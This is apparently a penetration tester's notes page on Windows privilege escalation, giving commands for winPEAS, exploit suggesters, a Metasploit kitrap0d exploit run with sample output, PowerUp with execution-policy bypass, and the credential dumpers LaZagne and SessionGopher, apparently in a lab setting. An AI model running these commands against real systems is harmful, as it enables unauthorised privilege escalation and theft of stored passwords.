https://www.hackingarticles.in/window-privilege-escalation-automated-script/
# Automated Tools
## winPEAS
`winpeas.exe` requires >= 4.5.2 **.NET**
If not present, use `winpeas.bat or winpeas.ps1`
It doesn't read *PowerShell history file*!

```powershell
winpeas.exe > output.txt
```
---
## Windows-Exploit-Suggester

```sh
# Update database
windows-exploit-suggester -u
wes -u
```

```powershell
# Run systeminfo on target machine & copy it's contents on Linux
systeminfo > sysinfo.txt
```

```sh
# Basic Syntax
windows-exploit-suggester -d [database.xls] -i sysinfo.txt
wes sysinfo.txt

# Search with OS name
windows-exploit-suggester -d [database.xls] -i sysinfo.txt -o <Os> -l

# Search Local/Remote exploits only
windows-exploit-suggester -d [database.xls] -i sysinfo.txt -o <Os> -l
windows-exploit-suggester -d [database.xls] -i sysinfo.txt -o <Os> -r
```

![[Pasted image 20231104175046.png]]

## Metasploit

```sh
msf6> use post/multi/recon/local_exploit_suggester
msf6> set SESSION [session_id]
msf6 post(multi/recon/local_exploit_suggester) > run

# OR run directly in meterpreter shell

meterpreter > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 31 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```

Going down the list, `bypassauc_eventvwr` fails due to the *IIS user not being a part of the administrator's group*, which is the default and expected. The second option, `ms10_015_kitrap0d`, does the trick.

```sh
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d
msf6 exploit(windows/local/ms10_015_kitrap0d) > show options

msf6 exploit(windows/local/ms10_015_kitrap0d) > set LPORT 1338
LPORT => 1338
msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 3
SESSION => 3
msf6 exploit(windows/local/ms10_015_kitrap0d) > run
```

---
## PowerUp
```powershell
powershell.exe -nop -exec bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

## PrivEscCheck
```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended

# Example Output (Shows MySQL is running as system)
IPv4 TCP   0.0.0.0:3306        LISTENING 5308 mysqld
Name        : MySQL
DisplayName : MySQL
ImagePath   : C:\xampp\mysql\bin\mysqld.exe MySQL
User        : LocalSystem
StartMode   : Automatic
```

## Seatbelt
```powershell
.\Seatbelt.exe -group=all
```
![[Pasted image 20240713131714.png]]

---
### LaZagne
Dump passwords from *web browsers, chat clients, databases, email, memory dumps, various sysadmin tools, and internal password storage mechanisms (i.e., Autologon, Credman, DPAPI, LSA secrets, etc.)*. The tool can be used to run all modules, specific modules (such as databases), or against a particular piece of software (i.e., *OpenVPN*)

https://github.com/AlessandroZ/LaZagne/releases/

```powershell
# Run all lazagne modules
PS C:\htb> .\LaZagne.exe all
```


### SessionGropher
Extracts *saved PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP credentials*. The tool is `written in PowerShell` and searches for and decrypts saved login information for remote access tools. It can be run locally or remotely. It searches the `HKEY_USERS` hive for all users who have logged into a domain-joined (or standalone) host and searches for and decrypts any saved session information it can find. It can also be run to search drives for *PuTTY private key files (.ppk), Remote Desktop (.rdp), and RSA (.sdtid)* files.
https://github.com/Arvanaghi/SessionGopher
```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```